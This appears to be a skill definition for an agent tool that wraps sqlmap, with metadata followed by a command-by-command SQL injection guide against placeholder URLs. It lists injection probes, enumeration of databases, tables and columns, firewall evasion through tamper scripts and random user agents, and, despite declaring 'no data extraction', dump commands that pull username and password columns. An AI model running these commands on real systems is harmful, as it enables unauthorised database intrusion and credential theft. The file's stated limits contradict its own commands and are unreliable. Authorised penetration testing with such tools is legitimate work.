---
name: sqlmap-detect
display_name: SQLMap Detect
version: 1.0.0
risk_level: medium
category: vuln_scan
external_binary: sqlmap
network_egress: required
expected_runtime_sec: 600
summary_size_hint: medium
---

no data extraction (use `sqlmap-dump` for that, with explicit authorisation).
Medium risk: non-destructive but does send crafted traffic.
## Core Workflow

### 1. Identify SQL Injection Vulnerability

#### Manual Verification

```bash
# Add single quote to break query
http://target.com/page.php?id=1'

# If error message appears, likely SQL injectable
# Error example: "You have an error in your SQL syntax"
```

#### Initial SQLMap Scan

```bash
# Basic vulnerability detection
sqlmap -u "http://target.com/page.php?id=1" --batch

# With verbosity for detailed output
sqlmap -u "http://target.com/page.php?id=1" --batch -v 3
```

### 2. Enumerate Databases

#### List All Databases

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs --batch
```

**Key Options:**

- `-u`: Target URL with injectable parameter
- `--dbs`: Enumerate database names
- `--batch`: Use default answers (non-interactive mode)

### 3. Enumerate Tables

#### List Tables in Specific Database

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables --batch
```

**Key Options:**

- `-D`: Specify target database name
- `--tables`: Enumerate table names

### 4. Enumerate Columns

#### List Columns in Specific Table

```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns --batch
```

**Key Options:**

- `-T`: Specify target table name
- `--columns`: Enumerate column names
## Troubleshooting

### Issue: "Parameter does not seem injectable"

**Cause**: SQLMap cannot find injection point
**Solution**:

```bash
# Increase testing level and risk
sqlmap -u "URL" --dbs --batch --level=5 --risk=3

# Specify parameter explicitly
sqlmap -u "URL" -p "id" --dbs --batch

# Try different injection techniques
sqlmap -u "URL" --dbs --batch --technique=BT

# Add prefix/suffix for filter bypass
sqlmap -u "URL" --dbs --batch --prefix="'" --suffix="-- -"
```

### Issue: Target Behind WAF/Firewall

**Cause**: Web Application Firewall blocking requests
**Solution**:

```bash
# Use tamper scripts
sqlmap -u "URL" --dbs --batch --tamper=space2comment

# List available tamper scripts
sqlmap --list-tampers

# Common tamper combinations
sqlmap -u "URL" --dbs --batch --tamper=space2comment,between,randomcase

# Add delay between requests
sqlmap -u "URL" --dbs --batch --delay=2

# Use random User-Agent
sqlmap -u "URL" --dbs --batch --random-agent
```

### Issue: Connection Timeout

**Cause**: Network issues or slow target
**Solution**:

```bash
# Increase timeout
sqlmap -u "URL" --dbs --batch --timeout=60

# Reduce threads
sqlmap -u "URL" --dbs --batch --threads=1

# Add retries
sqlmap -u "URL" --dbs --batch --retries=5
```

### Issue: Time-Based Attacks Too Slow

**Cause**: Default time delay too conservative
**Solution**:

```bash
# Reduce time delay (risky, may cause false negatives)
sqlmap -u "URL" --dbs --batch --time-sec=3

# Use boolean-based instead if possible
sqlmap -u "URL" --dbs --batch --technique=B
```

### Issue: Cannot Dump Large Tables

**Cause**: Table has too many records
**Solution**:

```bash
# Limit number of records
sqlmap -u "URL" -D db -T table --dump --batch --start=1 --stop=100

# Dump specific columns only
sqlmap -u "URL" -D db -T table -C username,password --dump --batch

# Exclude specific columns
sqlmap -u "URL" -D db -T table --dump --batch --exclude-sysdbs
```

### Issue: Session Drops During Long Scan

**Cause**: Session timeout or connection reset
**Solution**:

```bash
# Save and resume session
sqlmap -u "URL" --dbs --batch --output-dir=/root/sqlmap_session

# Resume from saved session
sqlmap -u "URL" --dbs --batch --resume

# Use persistent HTTP connection
sqlmap -u "URL" --dbs --batch --keep-alive
```

